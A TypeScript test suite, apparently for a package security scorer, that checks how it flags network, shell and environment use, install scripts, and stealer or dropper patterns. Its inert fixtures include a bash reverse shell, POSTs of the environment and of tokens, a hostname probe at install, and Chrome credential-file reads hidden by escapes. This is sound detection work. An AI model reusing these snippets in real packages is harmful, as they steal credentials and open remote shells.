// apm-score-v10: capabilities are listed for nothing, risk signals cost points, and a package's own declaration is
// compared with what its code shows. Every package here is an inert string: nothing is run, and the hosts are
// example.invalid or the endpoints' bare names.
import { describe, expect, test } from "bun:test";
import { analyze, declarationOf, finalize, findingsOf, parseAnalysis, POINTS, SCORE_FLOOR, type Analysis, type TarEntry } from "../src/index.ts";
import { supersetGaps } from "./superset.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

/** What a test adds to the manifest: lifecycle scripts, and a capability declaration (well formed or not). */
type Extra = { scripts?: Record<string, string>; apm?: { capabilities: Record<string, string | boolean | string[]> } };

function inputOf(files: Record<string, string>, extra: Extra = {}) {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", ...extra };

  return { name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] };
}

function scored(files: Record<string, string>, extra: Extra = {}): Analysis {
  return analyze(inputOf(files, extra));
}

const scoreOf = (a: Analysis): number => finalize(a, STATE).score;
const risks = (a: Analysis): string[] => a.signals.filter((s) => s.points < 0).map((s) => s.id);
const capability = (a: Analysis, id: string) => a.capabilities.find((c) => c.id === id);

/** An SDK: reads its API key and region from the environment, posts to its API, and has a sendmail transport. */
const SDK = [
  "const { spawn } = require('node:child_process');",
  "const fs = require('node:fs/promises');",
  "async function send(msg) {",
  "  const key = process.env.RESEND_API_KEY;",
  "  const region = process.env.AWS_REGION;",
  "  return fetch('https://api.example.invalid/emails', { method: 'POST', headers: { authorization: key, region }, body: JSON.stringify(msg) });",
  "}",
  "function sendmail(msg) { return spawn('/usr/sbin/sendmail', ['-t']); }",
  "const help = { env: ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY'] };",
  "module.exports = { send, sendmail, help, read: (p) => fs.readFile(p) };",
].join("\n");

describe("capabilities cost nothing", () => {
  test("an SDK that uses the network, the environment, files and a child process scores on its risk signals alone", () => {
    const a = scored({ "index.js": SDK });

    expect(a.capabilities.map((c) => `${c.id}:${c.status}:${c.basis}`)).toEqual(["network:not-declared:code", "env:not-declared:code", "filesystem:not-declared:code", "shell:not-declared:code"]);
    // the variable names in the help text are a mention, weak evidence
    expect(risks(a)).toEqual(["credential-mention"]);
    expect(scoreOf(a)).toBe(100 + POINTS["credential-mention"]);
    expect(capability(a, "env")?.names).toEqual(["RESEND_API_KEY", "AWS_REGION"]);
  });

  test("every capability keeps its evidence, so detection does not shrink", () => {
    const a = scored({ "index.js": SDK });

    expect(supersetGaps(inputOf({ "index.js": SDK }), a)).toEqual([]);
    expect(findingsOf(a).map((s) => s.id)).toEqual(expect.arrayContaining(["shell-exec", "network", "credential-access"]));
  });
});

describe("declared capabilities", () => {
  const full = { apm: { capabilities: { network: ["api.example.invalid"], env: ["AWS_*", "RESEND_API_KEY"], filesystem: "reads attachments", shell: "sendmail transport" } } };

  test("a full declaration marks each capability declared and costs nothing", () => {
    const a = scored({ "index.js": SDK }, full);

    expect(a.capabilities.every((c) => c.status === "declared")).toBe(true);
    expect(capability(a, "shell")?.declared).toBe("sendmail transport");
    expect(scoreOf(a)).toBe(100 + POINTS["credential-mention"]);
  });

  test("a capability the declaration leaves out is a risk signal; a declared one never used is a note", () => {
    const a = scored({ "index.js": SDK }, { apm: { capabilities: { network: true, env: ["AWS_*"], shell: "sendmail", eval: "templates" } } });

    expect(capability(a, "filesystem")?.status).toBe("undeclared");
    expect(capability(a, "eval")).toMatchObject({ status: "unused", evidence: [] });
    expect(a.signals.find((s) => s.id === "undeclared-capability")?.evidence).toEqual([expect.stringMatching(/^filesystem: index\.js:2:/)]);
    // the variables read outside the declared patterns are listed, not scored
    expect(capability(a, "env")?.outside).toEqual(["RESEND_API_KEY"]);
    expect(scoreOf(a)).toBe(100 + POINTS["credential-mention"] + POINTS["undeclared-capability"]);
  });

  test("each further undeclared capability costs less, up to a cap", () => {
    const a = scored({ "index.js": SDK }, { apm: { capabilities: { eval: "templates" } } });

    expect(a.signals.find((s) => s.id === "undeclared-capability")?.points).toBe(-20);
  });

  test("a capability seen only as text is not counted as undeclared", () => {
    const a = scored({ "index.js": "module.exports = ['child_process'];\n" }, { apm: { capabilities: {} } });

    expect(capability(a, "shell")).toMatchObject({ status: "undeclared", basis: "text" });
    expect(risks(a)).toEqual([]);
  });

  test("no apm field, or a malformed one, is no declaration", () => {
    expect(declarationOf({})).toEqual({ kind: "none", notes: [] });
    expect(declarationOf({ apm: { other: 1 } })).toEqual({ kind: "none", notes: [] });
    expect(declarationOf({ apm: { capabilities: "network" } })).toMatchObject({ kind: "none", notes: [expect.stringContaining("not an object")] });
    expect(declarationOf({ apm: { capabilities: { network: false, env: [], shell: "", gpu: true } } })).toEqual({ kind: "declared", capabilities: {}, notes: [expect.stringContaining('"gpu"')] });
  });
});

describe("install time, scaled by what runs there", () => {
  test("a build script at install is light; network and processes there are heavy", () => {
    const build = scored({ "index.js": "module.exports = 1;\n" }, { scripts: { install: "node-gyp rebuild" } });
    const fetching = scored({ "index.js": "module.exports = 1;\n", "setup.js": "require('https').get('https://example.invalid/bin');\nrequire('child_process').execFileSync('tar', ['x']);\n" }, { scripts: { postinstall: "node setup.js" } });

    expect(risks(build)).toEqual(["install-script"]);
    expect(risks(fetching)).toEqual(["install-network", "install-shell", "install-script"]);
    expect(capability(fetching, "install")?.evidence).toEqual(["package.json scripts.postinstall: node setup.js"]);
  });

  test("what an install script loads, or starts with a command, runs at install too", () => {
    const loaded = scored({ "index.js": "module.exports = 1;\n", "setup.js": "require('./lib/net.js');\n", "lib/net.js": "fetch('https://example.invalid');\n" }, { scripts: { postinstall: "node setup.js" } });
    const started = scored({ "index.js": "module.exports = 1;\n", "setup.js": "require('child_process').exec('node app.js');\n", "app.js": "eval(process.argv[2]);\n" }, { scripts: { postinstall: "node setup.js" } });

    expect(risks(loaded)).toContain("install-network");
    expect(risks(started)).toEqual(expect.arrayContaining(["install-shell", "install-eval"]));
  });

  test("the same code in the main file only is a capability", () => {
    const a = scored({ "index.js": "require('https').get('https://example.invalid/bin');\nrequire('child_process').execFileSync('tar', ['x']);\n" });

    expect(risks(a)).toEqual([]);
  });

  test("a probe that sends the machine's identity at install is refused", () => {
    const probe = "const os = require('os');\nrequire('https').get('https://example.invalid/?h=' + os.hostname() + '&u=' + os.userInfo().username);\n";
    const a = scored({ "index.js": probe }, { scripts: { preinstall: "node index.js" } });

    expect(risks(a)).toEqual(expect.arrayContaining(["exfiltration", "install-network"]));
    expect(scoreOf(a)).toBeLessThan(SCORE_FLOOR);
  });
});

describe("what stealers and droppers do", () => {
  test("a credential file read is heavy; the same path in a list is weak evidence", () => {
    const read = scored({ "index.js": "const p = require('path').join(require('os').homedir(), '.npmrc');\nmodule.exports = require('fs').readFileSync(p, 'utf8');\n" });
    const listed = scored({ "index.js": "module.exports = { deny: ['.env', '.npmrc'] };\n" });

    expect(risks(read)).toEqual(["credential-read"]);
    expect(risks(listed)).toEqual(["credential-mention"]);
  });

  test("a credential name hidden by escapes is a read where it is read, and a mention where it is only named", () => {
    const named = scored({ "index.js": "const p = '\\x4c\\x6f\\x67\\x69\\x6e' + ' Data';\nmodule.exports = p;\n" });
    const read = scored({ "index.js": "const p = '\\x4c\\x6f\\x67\\x69\\x6e' + ' Data';\nmodule.exports = require('fs').readFileSync(require('path').join(process.env.LOCALAPPDATA, 'Google/Chrome/User Data/Default', p));\n" });

    expect(risks(named)).toEqual(["credential-mention"]);
    expect(risks(read)).toContain("credential-read");
  });

  test("the whole environment next to a request is exfiltration; one variable is not", () => {
    const dump = scored({ "index.js": "fetch('https://example.invalid', { method: 'POST', body: JSON.stringify(process.env) });\n" });
    const one = scored({ "index.js": "fetch('https://example.invalid', { headers: { key: process.env.EXAMPLE_API_KEY } });\n" });

    expect(risks(dump)).toContain("exfiltration");
    expect(risks(one)).toEqual([]);
  });

  test("tokens from three credential families beside a request are exfiltration", () => {
    const a = scored({ "index.js": "const t = [process.env.NPM_TOKEN, process.env.GITHUB_TOKEN, process.env.AWS_SECRET_ACCESS_KEY];\nfetch('https://example.invalid', { method: 'POST', body: t.join() });\n" });

    expect(a.signals.find((s) => s.id === "exfiltration")?.evidence[0]).toContain("tokens");
  });

  test("a capture endpoint, a remote shell, and code run from a response", () => {
    const capture = scored({ "index.js": "fetch('https://webhook.site/0000', { method: 'POST' });\n" });
    const shell = scored({ "index.js": "require('child_process').exec('bash -i >& /dev/tcp/192.0.2.1/4444 0>&1');\n" });
    const fetched = scored({ "index.js": "require('axios').get('https://example.invalid').then((r) => eval(r.data));\n" });

    expect(risks(capture)).toEqual(["capture-endpoint"]);
    expect(risks(shell)).toEqual(["remote-shell"]);
    expect(risks(fetched)).toEqual(["remote-shell"]);
  });

  test("install instructions printed for a person are not a remote shell", () => {
    const a = scored({ "index.js": "console.log('install it with: curl -fsSL https://example.invalid/install | bash');\nrequire('child_process').spawnSync('node', ['-v']);\n" });

    expect(risks(a)).toEqual([]);
  });

  test("obfuscator output is heavy, encoded data alone is weak", () => {
    const names = Array.from({ length: 25 }, (_, i) => `_0x${(0xa000 + i).toString(16)}`);
    const obfuscated = scored({ "index.js": `var ${names.join(",")};\nmodule.exports = ${names[0] ?? ""};\n` });
    const wasm = scored({ "index.js": `module.exports = "${Buffer.concat([Buffer.from([0, 0x61, 0x73, 0x6d]), Buffer.alloc(1600, 1)]).toString("base64")}";\n` });

    expect(risks(obfuscated)).toEqual(["obfuscated"]);
    expect(risks(wasm)).toEqual(["encoded-data"]);
    expect(scoreOf(wasm)).toBe(100 + POINTS["encoded-data"]);
  });

  test("unusual combinations add up, to a cap", () => {
    const a = scored({ "index.js": "eval(process.argv[2]);\nfetch('https://example.invalid');\n" }, { scripts: { postinstall: "node-gyp rebuild" } });

    expect(a.signals.find((s) => s.id === "suspicious-combination")?.evidence[0]).toStartWith("runs code built at runtime");
  });

  test("status signals: yanked and deprecated cost points, revoked is final", () => {
    const a = scored({ "index.js": "module.exports = 1;\n" });

    expect(finalize(a, { ...STATE, status: "yanked" }).score).toBe(100 + POINTS.yanked);
    expect(finalize(a, { ...STATE, deprecated: "use x" }).score).toBe(100 + POINTS.deprecated);
    expect(finalize(a, { ...STATE, status: "revoked" }).score).toBe(0);
  });
});

describe("analyses stored by earlier scorers", () => {
  test("a v9 analysis still parses, with no capabilities, and scores as it did", () => {
    const v9 = { scorer: "apm-score-v9", signals: [{ id: "network", label: "Uses the network", points: -10, evidence: ["index.js:1: fetch(u)"], confidence: "confirmed" }], facts: scored({ "index.js": "1;\n" }).facts };
    const a = parseAnalysis(v9);

    expect(a?.scorer).toBe("apm-score-v9");
    expect(a?.capabilities).toEqual([]);
    expect(a ? scoreOf(a) : null).toBe(90);
  });
});
